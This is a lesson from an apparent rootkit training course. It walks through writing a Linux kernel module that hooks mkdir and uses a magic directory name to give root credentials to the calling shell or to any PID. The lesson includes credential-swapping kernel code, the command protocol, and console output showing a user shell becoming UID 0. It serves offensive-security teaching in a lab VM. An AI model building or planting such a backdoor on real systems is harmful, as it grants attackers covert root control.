# L07: Elevate a Process by PID

L06 changed only `current`, the process executing the intercepted syscall.
This exercise resolves another live task by PID and replaces that task's
credentials immediately.

Two command forms are supported:

```text
rklings.e         elevate the parent of the mkdir process
rklings.e.<pid>   elevate that exact PID
```

## What you will observe

The short command targets the interactive shell that launched `/usr/bin/mkdir`:

```console
student@victim:~$ id -u
1000
student@victim:~$ mkdir /tmp/rklings.e
mkdir: cannot create directory '/tmp/rklings.e': No such file or directory
student@victim:~$ id -u
0
```

The explicit form can target a separate process:

```console
root@victim:~# sleep 3600 &
[1] 1234
root@victim:~# mkdir /tmp/rklings.e.1234
```

The credential replacement happens during that `mkdir` call; the target does not
need to poll a file or execute another command.

## Workspace

The supplied `rklings_hook.h` still owns `mkdir` interception.
The TODOs in `main.c` are:

- `rk_escalate_pid`, which safely acquires a task and publishes credentials;
- command parsing for the parent and explicit-PID forms.

Read the task lifetime and credential lifetime sections before implementing
either TODO.

## Why the parent command works

A shell normally forks a child to run `/usr/bin/mkdir`:

```text
+-----------------------------+
| interactive shell           |
| PID 1200, UID 1000          |
+--------------+--------------+
               | fork and exec
               v
+-----------------------------+
| /usr/bin/mkdir              |
| PID 1234, parent PID 1200   |
+--------------+--------------+
               | mkdir("rklings.e")
               v
+-----------------------------+
| kernel callback             |
| current = PID 1234          |
| task_ppid_nr(current) = 1200|
+--------------+--------------+
               | elevate PID 1200
               v
+-----------------------------+
| interactive shell           |
| PID 1200, UID 0             |
+-----------------------------+
```

L06 elevated PID 1234, which immediately exited.
L07 resolves PID 1200 instead, so the durable shell receives the credentials.

## Parse the two command forms

The fixed command is nine bytes long:

```c
#define RK_CMD     "rklings.e"
#define RK_CMD_LEN 9
```

After confirming that prefix, inspect the next byte:

```text
name                 byte after rklings.e       target
-----------------    --------------------       ---------------------
rklings.e            '\0'                       parent of current
rklings.e.1234       '.'                        parsed PID 1234
rklings.extra        'x'                        reject with -EINVAL
rklings.e.nope       '.'                        reject with -EINVAL
```

Use `kstrtoint` for the decimal PID and reject zero or negative values.
Do not use `atoi`; the kernel does not provide the userspace C library.

## Acquire a stable task reference

A PID can disappear while the callback is running.
Looking up a raw `task_struct *` and using it after the process exits would
access freed kernel memory.

Resolve the PID under RCU and acquire a task reference before leaving the RCU
read-side critical section:

```text
rcu_read_lock()
        |
        +-- find_vpid(pid)
        +-- pid_task(...)
        +-- missing? return -ESRCH
        +-- get_task_struct(task)
                    |
rcu_read_unlock()   | task remains alive through this reference
                    v
             use task safely
                    |
                    v
             put_task_struct(task)
```

`find_vpid` resolves the numeric PID in the current PID namespace. `pid_task`
obtains the task attached to that PID. `get_task_struct` increments its
reference count.

Reject `task->mm == NULL`.
Tasks without a userspace memory descriptor are kernel threads and are not valid
targets for this operation.

## Publish both credential pointers

A task has two credential pointers relevant here:

```text
task->cred         credentials used by permission checks
task->real_cred    objective credentials describing the task itself
```

Prepare one privileged credential object, then hold two references because the
task will point to it from both fields:

```text
prepare_kernel_cred(&init_task)
               | one reference
               v
         new_cred
               | get_cred(new_cred)
               v
          two references
          +----+----+
          v         v
    task->cred  task->real_cred
```

Lock the task while replacing the pointers:

```c
task_lock(task);
old_cred = task->cred;
old_real_cred = task->real_cred;
get_cred(new_cred);
rcu_assign_pointer(task->real_cred, new_cred);
rcu_assign_pointer(task->cred, new_cred);
task_unlock(task);
```

After publication, release both old credential references and the task
reference.
Every successful `get_cred` or `get_task_struct` must have a matching release.

Directly changing another task's credentials bypasses the normal
`commit_creds(current)` path and depends on kernel credential internals.
Keep the complete replacement and reference accounting together in
`rk_escalate_pid`.

## Implement it

In `rk_escalate_pid`:

1. Resolve the PID under `rcu_read_lock`.
2. Return `-ESRCH` when no task exists.
3. Acquire the task reference before unlocking RCU.
4. Reject a kernel thread with `-EINVAL` and release the task.
5. Prepare privileged credentials; return `-ENOMEM` on failure.
6. Under `task_lock`, save both old pointers and publish the new object.
7. Release both old credential references and the task reference.

In `RK_ON_MKDIR`:

1. Return `0` for names outside the `rklings.e` command boundary.
2. Select `task_ppid_nr(current)` for the command without an argument.
3. Parse and validate the PID after `rklings.e.` for the explicit form.
4. Call `rk_escalate_pid` and preserve its exact error.
5. Log the elevated PID and return `-ENOENT` after success.

The hook lifecycle remains provided.

## Test it

Build and enter the student VM:

```console
$ ./rklings run L07
```

The module is preloaded.
First test the parent-shell form:

```console
student@victim:~$ echo $$
1200
student@victim:~$ id -u
1000
student@victim:~$ mkdir /tmp/rklings.e
mkdir: cannot create directory '/tmp/rklings.e': No such file or directory
student@victim:~$ id -u
0
```

For an explicit target, start a fresh exercise instance or another student
process, note its PID, and use `rklings.e.<pid>`.
An invalid suffix such as `rklings.e.nope` must return an error without changing
another task.

## Validate

From the repository root:

```console
$ ./rklings validate L07
```

The checks cover parent-shell targeting, explicit PID targeting, immediate
credential visibility, the escalation log, and module unload.

## Next

The command works, but `rklings_hook.h` still hides how the syscall is
intercepted.
L08 replaces that header with directly registered kprobes and extracts the
pathname from the captured register state.
